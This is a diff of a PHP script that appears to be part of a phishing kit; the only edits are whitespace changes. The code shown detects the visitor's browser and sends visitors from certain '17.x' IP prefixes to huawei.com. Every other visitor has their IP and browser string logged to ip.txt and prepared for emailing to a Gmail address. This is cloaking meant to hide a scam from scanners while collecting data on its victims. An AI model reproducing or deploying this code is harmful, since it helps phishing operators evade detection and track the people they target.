@@ -8,7 +8,7 @@ function getBrowser()
     $u_agent = $_SERVER['HTTP_USER_AGENT']; 
     $bname = 'Unknown';
     $platform = 'Unknown';
-    $version= "";
+    $version="";
 
     //First get the platform?
     if (preg_match('/linux/i', $u_agent)) {
@@ -25,32 +25,32 @@ function getBrowser()
     if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)) 
     { 
         $bname = 'Internet Explorer'; 
-        $ub = "MSIE"; 
+        $ub ="MSIE"; 
     } 
     elseif(preg_match('/Firefox/i',$u_agent)) 
     { 
         $bname = 'Mozilla Firefox'; 
-        $ub = "Firefox"; 
+        $ub ="Firefox"; 
     } 
     elseif(preg_match('/Chrome/i',$u_agent)) 
     { 
         $bname = 'Google Chrome'; 
-        $ub = "Chrome"; 
+        $ub ="Chrome"; 
     } 
     elseif(preg_match('/Safari/i',$u_agent)) 
     { 
         $bname = 'Apple Safari'; 
-        $ub = "Safari"; 
+        $ub ="Safari"; 
     } 
     elseif(preg_match('/Opera/i',$u_agent)) 
     { 
         $bname = 'Opera'; 
-        $ub = "Opera"; 
+        $ub ="Opera"; 
     } 
     elseif(preg_match('/Netscape/i',$u_agent)) 
     { 
         $bname = 'Netscape'; 
-        $ub = "Netscape"; 
+        $ub ="Netscape"; 
     } 
     
     // finally get the correct version number
@@ -91,7 +91,7 @@ function getBrowser()
 
 // now try it
 $ua=getBrowser();
-$yourbrowser= "Your browser: " . $ua['name'] . " " . $ua['version'] . " on " .$ua['platform'] . " reports: " . $ua['userAgent'];
+$yourbrowser="Your browser:" . $ua['name'] ."" . $ua['version'] ." on" .$ua['platform'] ." reports:" . $ua['userAgent'];
 
 
 
@@ -101,10 +101,10 @@ $ip = $_SERVER['REMOTE_ADDR'];
 $result1 = substr($ip, 0, 6);
 $result2 = substr($ip, 0, 6);
 $result3 = substr($ip, 0, 6);
-$block = "17.198";
-$block1 = "17.149";
-$block2 = "17.168";
-$block3 = "17.150";
+$block ="17.198";
+$block1 ="17.149";
+$block2 ="17.168";
+$block3 ="17.150";
 
 
 if($result1 == $block  or $result2 == $block2 or $result2 == $block1 ){
@@ -119,13 +119,13 @@ header("Location: https://huawei.com");
     
 }else{
 
-$pfw_subject = "Done ";
-$pfw_email_to = "aminahima54@gmail.com";
-$pfw_message = "Client's IP: $ip\n"
-. " $yourbrowser\n"
-. "ip: $ip\n";
+$pfw_subject ="Done";
+$pfw_email_to ="aminahima54@gmail.com";
+$pfw_message ="Client's IP: $ip\n"
+." $yourbrowser\n"
+."ip: $ip\n";
 
-$myfile = fopen("ip.txt", "a") or die("Unable to open file!");
+$myfile = fopen("ip.txt","a") or die("Unable to open file!");
 $txt = $pfw_message;
 fwrite($myfile, $txt);
 fclose($myfile);
